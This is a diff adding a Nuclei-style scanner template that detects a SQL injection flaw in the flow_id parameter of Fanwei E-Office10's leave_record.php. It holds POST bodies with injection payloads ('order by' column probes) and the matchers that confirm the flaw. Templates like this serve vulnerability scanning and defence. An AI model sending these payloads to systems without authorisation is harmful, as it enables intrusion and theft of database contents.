@@ -1,0 +1,66 @@
+id: fanwei-eoffice10-sql-injection
+
+info:
+  name: Fanwei E-Office10 flow_id Parameter SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Fanwei E-Office10 has a SQL injection vulnerability in the flow_id parameter of `leave_record.php`, allowing attackers to potentially extract sensitive database information.
+  reference:
+    - https://www.e-office.cn
+  tags: sql-injection
+
+variables:
+  indicator: "0x000013"
+
+flow: |
+  http(1) && http(2) && http(3)
+
+http:
+  - id: check-indicator
+    method: GET
+    path:
+      - "/eoffice10/server/ext/system_support/leave_record.php"
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{indicator}}"
+    matchers-condition: and
+
+  - id: check-sql-injection-1
+    method: POST
+    path:
+      - "/eoffice10/server/ext/system_support/leave_record.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "login_user_id=1&flow_id=1' order by 1#&table_field=id&table_field_name=id&max_rows=10"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "未找到相关数据"
+      - type: status
+        status:
+          - 200
+    matchers-condition: and
+
+  - id: check-sql-injection-2
+    method: POST
+    path:
+      - "/eoffice10/server/ext/system_support/leave_record.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "login_user_id=1&flow_id=1' order by 2#&table_field=id&table_field_name=id&max_rows=10"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{indicator}}"
+      - type: status
+        status:
+          - 200
+    matchers-condition: and
